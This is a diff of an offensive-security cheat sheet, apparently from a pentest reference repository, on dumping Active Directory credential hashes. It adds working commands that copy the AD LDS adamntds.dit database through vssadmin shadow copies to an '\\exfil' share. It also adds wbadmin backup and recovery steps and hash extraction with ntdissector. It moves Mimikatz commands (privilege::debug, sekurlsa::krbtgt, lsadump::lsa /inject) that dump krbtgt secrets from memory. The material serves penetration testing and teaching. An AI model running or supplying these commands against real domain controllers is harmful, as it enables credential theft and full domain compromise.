@@ -72,15 +72,28 @@ secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
 * `-user-status`: Display whether or not the user is disabled.
 
 
-## Using Mimikatz sekurlsa
+## Extract hashes from adamntds.dit
 
-Dumps credential data in an Active Directory domain when run on a Domain Controller.
-:warning: Requires administrator access with debug or Local SYSTEM rights
+In AD LDS stores the data inside a dit file located at `C:\Program Files\Microsoft ADAM\instance1\data\adamntds.dit`.
 
-```powershell
-sekurlsa::krbtgt
-lsadump::lsa /inject /name:krbtgt
-```
+* Dump adamntds.dit with Shadow copy using `vssadmin.exe`
+    ```ps1
+    vssadmin.exe create shadow /For=C:
+    cp "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Program files\Microsoft ADAM\instance1\data\adamntds.dit" \\exfil\data\adamntds.dit
+    ```
+
+* Dump adamntds.dit with Windows Server Backup using `wbadmin.exe`
+    ```ps1
+    wbadmin.exe start backup -backupTarget:e: -vssCopy -include:"C:\Program Files\Microsoft ADAM\instance1\data\adamntds.dit"
+    wbadmin.exe start recovery -version:08/04/2023-12:59 -items:"c:\Program Files\Microsoft ADAM\instance1\data\adamntds.dit" -itemType:File -recoveryTarget:C:\Users\Administrator\Desktop\ -backupTarget:e:
+    ```
+
+* Extract hashes with [synacktiv/ntdissector](https://github.com/synacktiv/ntdissector)
+    ```ps1
+    ntdissector path/to/adamntds.dit
+    python ntdissector/tools/user_to_secretsdump.py path/to/output/*.json
+    ```
+
 
 ## Crack NTLM hashes with hashcat
 
@@ -90,7 +103,7 @@ Recommended wordlists:
 - [Rockyou.txt](https://weakpass.com/wordlist/90)
 - [Have I Been Pwned founds](https://hashmob.net/hashlists/info/4169-Have%20I%20been%20Pwned%20V8%20(NTLM))
 - [Weakpass.com](https://weakpass.com/)
-- Read More at [Methodology and Resources/Hash Cracking.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md)
+- Read More at [Methodology and Resources/Hash Cracking.md](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/)
 
 ```powershell
 # Basic wordlist
@@ -125,7 +138,21 @@ This means the hashes can be trivially reversed to the cleartext values, hence t
 The password retrieval is already handled by [SecureAuthCorp/secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) and mimikatz, it will be displayed as CLEARTEXT. 
 
 
+## Extract hashes from memory
+
+Dumps credential data in an Active Directory domain when run on a Domain Controller.
+
+:warning: Requires administrator access with debug privilege or NT-AUTHORITY\SYSTEM account.
+
+```powershell
+mimikatz> privilege::debug
+mimikatz> sekurlsa::krbtgt
+mimikatz> lsadump::lsa /inject /name:krbtgt
+```
+
+
 ## References
 
-* [DiskShadow The return of VSS Evasion Persistence and AD DB extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
-* [Dumping Domain Password Hashes - Pentestlab](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
+* [Diskshadow The Return Of VSS Evasion Persistence And AD Db Extraction - bohops - March 26, 2018](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
+* [Dumping Domain Password Hashes - Pentestlab - July 4, 2018](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
+* [Using Ntdissector To Extract Secrets From Adam Ntds Files - Julien Legras, Mehdi Elyassa - 06/12/2023](https://www.synacktiv.com/publications/using-ntdissector-to-extract-secrets-from-adam-ntds-files)
